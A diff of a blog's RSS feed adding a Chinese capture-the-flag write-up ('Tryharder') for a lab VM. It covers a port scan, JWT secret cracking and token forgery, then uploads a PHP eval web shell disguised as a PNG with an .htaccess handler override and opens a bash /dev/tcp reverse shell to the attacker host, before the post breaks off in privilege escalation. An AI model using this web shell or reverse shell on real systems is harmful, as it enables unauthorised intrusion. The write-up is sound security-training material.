@@ -1,5 +1,124 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Thu, 03 Jul 2025 08:57:04 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>galera</title><link>https://dehua-rd.github.io/post/galera.html</link><description># Galera HVM
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Sat, 05 Jul 2025 07:08:07 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>Tryharder</title><link>https://dehua-rd.github.io/post/Tryharder.html</link><description># Tryharder
+
+&gt; 日期：2025-07-04 ｜ 作者：dehua ｜ 标签：hvm，jwt， LD_PRELOAD
+
+---
+
+## 信息收集阶段
+
+首先对目标进行端口扫描，发现开放的服务如下：
+
+```bash
+nmap -sCV -p- 192.168.218.185
+```
+
+```text
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
+|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
+|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-server-header: Apache/2.4.59 (Debian)
+|_http-title: 西溪湖科技 - 企业门户网站
+```
+
+---
+
+## 漏洞利用过程
+
+主页是一个静态页面，啥也干不了，看源码有发现 API 路径，像是 Base64 编码：
+
+&lt;img width='936' height='328' alt='Image' src='https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1' /&gt;
+
+```bash
+echo 'NzQyMjE=' | base64 -d
+# 输出：74221
+```
+
+访问 `/74221/` 是一个登录页面，继续进行目录扫描：
+
+```bash
+gobuster dir -u http://192.168.218.185/74221/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
+```
+
+```text
+/uploads              (Status: 301)
+/index.php            (Status: 200)
+/dashboard.php        (Status: 302)
+```
+
+登录账号：test  密码：123456
+
+&lt;img width='1840' height='939' alt='Image' src='https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3' /&gt;
+
+
+
+登录后发现是 JWT 身份验证，抓取 token 后尝试使用 hashcat 破解：
+
+
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+```text
+候选密钥：jwtsecret123
+```
+
+&lt;img width='1919' height='616' alt='Image' src='https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec' /&gt;
+
+&lt;img width='1915' height='608' alt='Image' src='https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d' /&gt;
+
+忘截图了，上面token中的sub是上传目录把123改成999，不然可能上传不成功
+使用伪造 token 后页面出现上传功能，上传如下两个文件：
+
+**shell.png**
+
+```php
+&lt;?php @eval($_POST['cmd']); ?&gt;
+```
+
+**.htaccess**
+
+```apache
+&lt;IfModule mime_module&gt;
+	AddHandler php5-script .png
+	SetHandler application/x-httpd-php
+&lt;/IfModule&gt;
+```
+
+访问 payload 后执行：
+
+&lt;img width='917' height='111' alt='Image' src='https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5' /&gt;
+
+```php
+cmd=system('/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp;/dev/tcp/192.168.218.148/1234 0&gt;&amp;1'');
+```
+
+&lt;img width='924' height='221' alt='Image' src='https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1' /&gt;
+
+## 权限提升分析
+
+在 pentester 用户主目录中找到 `.note` 文件，结合 `/etc/passwd` 中的信息
+但是我是想了很久也不知道这在提示什么，还是GPT好使，GPT告诉我可能与加密，隐写，凯撒密码这些有关，然后我开始对照这些语句的原文开始猜测，然后又浪费了很多时间，也没解出来，最后看了佬的wp，原来是找隐藏文件
+
+```bash
+find / -name '.*' 2&gt;/dev/null | grep -v sys
+```
+先看/srv
+```bash
+www-data@Tryharder:/srv$ cat ...
+Iuwbtthfbetuoftimfs'iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
+```
+看着跟passwd中的提示很像，可能是移位密码
+再看看secret中的提示
+```bash
+www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ cat note2.txt 
+```
+
+问了一手gpt：
+•	方法 1：第一段 = 第二段 + 固定位移（如凯撒 +5）。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/Tryharder.html</guid><pubDate>Sat, 05 Jul 2025 07:07:38 +0000</pubDate></item><item><title>galera</title><link>https://dehua-rd.github.io/post/galera.html</link><description># Galera HVM
 
 &gt; 日期：2025-07-02 ｜ 作者：dehua ｜ 标签：第一个wp博客，有什么改进的可以留下评论
 
